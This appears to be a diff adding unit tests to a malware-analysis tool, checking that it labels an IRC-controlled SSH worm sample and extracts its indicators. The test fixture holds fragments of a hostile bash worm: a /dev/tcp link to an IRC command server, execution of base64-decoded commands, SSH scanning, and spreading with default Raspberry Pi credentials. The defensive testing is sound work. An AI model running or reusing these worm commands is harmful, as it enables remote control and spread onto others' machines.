@@ -201,6 +201,42 @@ class Samples(unittest.TestCase):
         ha.analyze_sample(f"import pathlib\npathlib.Path({str(marker)!r}).write_text('x')\n".encode())
         self.assertFalse(marker.exists())
 
+    def test_irc_ssh_worm_is_explained_without_false_miner_or_reverse_shell(self):
+        sample = b"""#!/bin/bash
+arr[0]="ix1.undernet.org"
+exec 3<>/dev/tcp/$svr/6667
+printf "JOIN #biret\\r\\n" >&3
+printf "PRIVMSG $nick :$cmd\\r\\n" >&3
+CMD=$(echo "$data" | base64 -d)
+RES=$(bash -c "$CMD")
+killall minerd
+rm -rf /tmp/cpuminer-multi
+zmap -p 22 -o "$FILE" -n 100000
+sshpass -praspberry scp "$MYSELF" pi@$IP:/tmp/$NAME
+sshpass -praspberryraspberry993311 ssh pi@$IP
+"""
+        a = ha.analyze_sample(sample)
+        behaviors = {x["id"]: x for x in a["script_analysis"]["behaviors"]}
+        self.assertIn("irc-c2", behaviors)
+        self.assertIn("ssh-worm", behaviors)
+        self.assertIn("irc-command-exec", behaviors)
+        self.assertIn("competitor-cleanup", behaviors)
+        self.assertNotIn("miner-execution", behaviors)
+        self.assertNotIn("reverse-shell", a["tags"])
+        self.assertNotIn("Cryptocurrency miner", a["families"])
+        self.assertIn("Miner-related cleanup / competitor removal", a["families"])
+        self.assertEqual(a["iocs"]["irc_channels"], ["#biret"])
+        self.assertIn("ix1.undernet.org", a["iocs"]["irc_servers"])
+        self.assertIn(6667, a["iocs"]["ports"])
+        self.assertIn(22, a["iocs"]["ports"])
+        self.assertEqual(a["iocs"]["credentials"][0]["password"], "raspberry")
+        self.assertEqual(a["iocs"]["credentials"][0]["username"], "pi")
+
+    def test_domain_and_ssh_password_iocs_are_extracted(self):
+        ioc = ha.find_iocs("host bins.deutschland-zahlung.eu; sshpass -praspberry scp x pi@$IP:/tmp/x")
+        self.assertIn("bins.deutschland-zahlung.eu", [x["value"] for x in ioc["domains"]])
+        self.assertEqual(ioc["credentials"][0], {"service": "ssh", "username": "pi", "password": "raspberry"})
+
 
 class FakeHp:
     def __init__(self):
